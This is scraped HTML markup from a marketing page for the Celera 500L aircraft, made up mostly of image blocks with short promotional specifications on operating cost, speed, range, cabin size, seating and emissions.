          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500429673-1MYWJXIQ0NXEO0R3NESO/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500429673-1MYWJXIQ0NXEO0R3NESO/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy.png" data-load="false" data-image-id="5f37ec0d6e8d155f9ee594d2" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500429673-1MYWJXIQ0NXEO0R3NESO/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_16138"><div><h3>$328 hourly operating costs</h3><p>(a comparable jet aircraft costs $2,100 per hour)</p></div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_35120"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500450140-T0U4DO8CID1Q69T6OYXC/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+2.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500450140-T0U4DO8CID1Q69T6OYXC/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+2.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 2.png" data-load="false" data-image-id="5f37ec222aad3222fbf28b6c" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500450140-T0U4DO8CID1Q69T6OYXC/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+2.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_10675"><p><h3>Max cruise speed projected to be in excess of 460 mph</h3></p></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_36650"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500484870-35OK5KGMK3KCS0LT239J/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+3.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500484870-35OK5KGMK3KCS0LT239J/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+3.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 3.png" data-load="false" data-image-id="5f37ec44d6890509948ae204" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500484870-35OK5KGMK3KCS0LT239J/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+3.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_20579"><p><h3>4,500 nautical mile range</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_38203"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500509446-TY0YCW3Z0515ATZKUZRX/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+4.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500509446-TY0YCW3Z0515ATZKUZRX/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+4.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 4.png" data-load="false" data-image-id="5f37ec5d3466a3251475b77c" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500509446-TY0YCW3Z0515ATZKUZRX/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+4.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_21402"><p><h3>Payload ‚Äì 6 adult passengers</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597499460996_39760"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500535394-RXNTN4VX24VMCKPO55JT/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+5.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500535394-RXNTN4VX24VMCKPO55JT/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+5.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 5.png" data-load="false" data-image-id="5f37ec777b61860287b408d3" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500535394-RXNTN4VX24VMCKPO55JT/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+5.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597499460996_22907"><p><h3>Comfort ‚Äì 6‚Äô2‚Äù cabin height with 6 first-class seats</h3></p></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597512042385_58579"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597512859185-7NH3LJNQNF3AEUUJC5S9/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+6.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597512859185-7NH3LJNQNF3AEUUJC5S9/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+6.png" data-image-dimensions="251x251" data-image-focal-point="0.5,0.5" alt="Artboard 5 copy 6.png" data-load="false" data-image-id="5f381c9bcff70e7afc9833ff" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597512859185-7NH3LJNQNF3AEUUJC5S9/ke17ZwdGBToddI8pDm48kMbnXcPgQhyYbpxyGkAEC8ZZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7dVqjJOA2bbs_Tozk7Nfgn5iQDHfukLd1_DXrB3osEO3VWAjP-RAU2L5B8mQUEUJpA/Artboard+5+copy+6.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597512042385_53128"><p><h3>The Celera 500L‚Äôs reduction in carbon emissions beats FAA and ICAO target emissions standards for aircraft entering service in or after 2031 by over 30%</h3></p></div></div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-38" data-collection-id="5f416f9fa662a5713434fd52" data-parallax-id="5f416f9fa662a5713434fd52" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598544069818" id="page-5f416f9fa662a5713434fd52"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1598123935995_103278"><div><h2>CABIN COMFORT</h2><p>Superior comfort is delivered through a spacious cabin with a 6‚Äô2‚Äù height, plus six first-class equivalent seats that come in a customizable configuration.</p></div></div></div></div><div><div><div data-aspect-ratio="57.55725190839694" data-block-type="5" id="block-0186cef93f2eb6ff6949"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598125077253-WKFTFU9IXA0P6FV2C7NC/ke17ZwdGBToddI8pDm48kDP0I2FGcIvszmigOvvSKQVZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwH7_TJpxliBUPJg-yA3YbUf3xtZbYxpnBewiaDHhImEkbX9wBIXzx9Bd5CHG0Lug0/Artboard+1%402x.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598125077253-WKFTFU9IXA0P6FV2C7NC/ke17ZwdGBToddI8pDm48kDP0I2FGcIvszmigOvvSKQVZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwH7_TJpxliBUPJg-yA3YbUf3xtZbYxpnBewiaDHhImEkbX9wBIXzx9Bd5CHG0Lug0/Artboard+1%402x.png" data-image-dimensions="655x404" data-image-focal-point="0.5,0.5" alt="Artboard 1@2x.png" data-load="false" data-image-id="5f4174153a78755690f98121" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598125077253-WKFTFU9IXA0P6FV2C7NC/ke17ZwdGBToddI8pDm48kDP0I2FGcIvszmigOvvSKQVZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpwH7_TJpxliBUPJg-yA3YbUf3xtZbYxpnBewiaDHhImEkbX9wBIXzx9Bd5CHG0Lug0/Artboard+1%402x.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-aspect-ratio="67.03146374829001" data-block-type="5" id="block-yui_3_17_2_1_1598215388769_7308"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598544038919-UGNUJD296S3XBMD20YQU/ke17ZwdGBToddI8pDm48kI0PPfaIelT6SC7kpTD6Cdx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URS0yeOn2t9HRIHq8sCmA0ZOyR34UwcEYwsqCfG35AFg86iGyAHoWEzl9kO54n1N1Q/Celera+500L%2C+LIGHT+INTERIOR+VIEW%2C+illustration.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598544038919-UGNUJD296S3XBMD20YQU/ke17ZwdGBToddI8pDm48kI0PPfaIelT6SC7kpTD6Cdx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URS0yeOn2t9HRIHq8sCmA0ZOyR34UwcEYwsqCfG35AFg86iGyAHoWEzl9kO54n1N1Q/Celera+500L%2C+LIGHT+INTERIOR+VIEW%2C+illustration.jpg" data-image-dimensions="1520x1174" data-image-focal-point="0.5,0.5" alt="Celera 500L, LIGHT INTERIOR VIEW, illustration.jpg" data-load="false" data-image-id="5f47d8a3bec2324127338dbe" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598544038919-UGNUJD296S3XBMD20YQU/ke17ZwdGBToddI8pDm48kI0PPfaIelT6SC7kpTD6Cdx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1URS0yeOn2t9HRIHq8sCmA0ZOyR34UwcEYwsqCfG35AFg86iGyAHoWEzl9kO54n1N1Q/Celera+500L%2C+LIGHT+INTERIOR+VIEW%2C+illustration.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-16" data-parallax-original-element="" data-collection-id="5f369f354bea837293b205fd" data-parallax-id="5f369f354bea837293b205fd" data-edit-main-image="Background">
        
        
        
          
            <figure data-parallax-image-wrapper="">
              
  <img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597497459891-JEZ4FUK7QBL4WML4Y9BX/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/IMG_8009+edited.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597497459891-JEZ4FUK7QBL4WML4Y9BX/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/IMG_8009+edited.jpg" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="IMG_8009 edited.jpg" data-load="false" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597497459891-JEZ4FUK7QBL4WML4Y9BX/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/IMG_8009+edited.jpg">

            </figure>
          
        
      </section>

    

  

    

      <section id="new-page-5" data-collection-id="5f35e2dad3b01649fe69b19c" data-parallax-id="5f35e2dad3b01649fe69b19c" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598478811561" id="page-5f35e2dad3b01649fe69b19c"><div><div><div data-block-type="23" id="block-yui_3_17_2_1_1597412812791_56319"><p><h2>
  <center><strong><span> It doesn't just outperform <br>
in every category. it crushes it.</span></strong></center>
</h2></p></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1598297383710_15073"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598478790066-MAHLOYDNP8YNNNFEERO2/ke17ZwdGBToddI8pDm48kFZ_sTh7YZIW3_Zoc3kUgdd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0tuQyATp5Ln32JdtPG7_1NRNe_fGcjHNGLHpZQrTBR4mg-6JhFotYQqsTpLRDwWsMA/Celera+500L%2C+comparable+graphic.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598478790066-MAHLOYDNP8YNNNFEERO2/ke17ZwdGBToddI8pDm48kFZ_sTh7YZIW3_Zoc3kUgdd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0tuQyATp5Ln32JdtPG7_1NRNe_fGcjHNGLHpZQrTBR4mg-6JhFotYQqsTpLRDwWsMA/Celera+500L%2C+comparable+graphic.png" data-image-dimensions="2500x2191" data-image-focal-point="0.5,0.5" alt="Celera 500L, comparable graphic.png" data-load="false" data-image-id="5f46d9c5f084df2a422bea80" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1598478790066-MAHLOYDNP8YNNNFEERO2/ke17ZwdGBToddI8pDm48kFZ_sTh7YZIW3_Zoc3kUgdd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0tuQyATp5Ln32JdtPG7_1NRNe_fGcjHNGLHpZQrTBR4mg-6JhFotYQqsTpLRDwWsMA/Celera+500L%2C+comparable+graphic.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_27999"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501568705-SQLPETERAOWBJ9O8BZYG/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/1.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501568705-SQLPETERAOWBJ9O8BZYG/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/1.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="1.png" data-load="false" data-image-id="5f37f0805ff12d0233511046" data-type="image" src="https://www.ottoaviation.com/1.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_29973"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501588773-IY2XZ93O3OO1S3J2AHDR/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/2.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501588773-IY2XZ93O3OO1S3J2AHDR/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/2.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="2.png" data-load="false" data-image-id="5f37f094551f1545775a4837" data-type="image" src="https://www.ottoaviation.com/2.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_21075"><p><h3>Passenger capacity (6) of a Light/Midsize Jet with larger and more comfortable seats</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_32243"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501607852-AZM63XRTI7Z4GYLWQRHC/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/3.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597501607852-AZM63XRTI7Z4GYLWQRHC/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/3.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="3.png" data-load="false" data-image-id="5f37f0a73466a325147625a0" data-type="image" src="https://www.ottoaviation.com/3.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_22458"><p><h3>Cabin volume (448 ft¬≥) of a Midsize Jet</h3></p></div></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_71766"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502062445-INUWWXPKLN83Q9N5JH2G/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/image-asset.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502062445-INUWWXPKLN83Q9N5JH2G/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/image-asset.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="" data-load="false" data-image-id="5f37f26ede22531a4d790dc0" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502062445-INUWWXPKLN83Q9N5JH2G/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/image-asset.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_73478"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502077265-12SO3F2QXZRAGESLWL69/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/5.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502077265-12SO3F2QXZRAGESLWL69/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/5.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="5.png" data-load="false" data-image-id="5f37f27d3466a3251476526d" data-type="image" src="https://www.ottoaviation.com/5.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_67950"><p><h3>Range of a large cabin aircraft</h3></p></div></div><div><div data-block-type="5" id="block-yui_3_17_2_1_1597500732754_74975"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
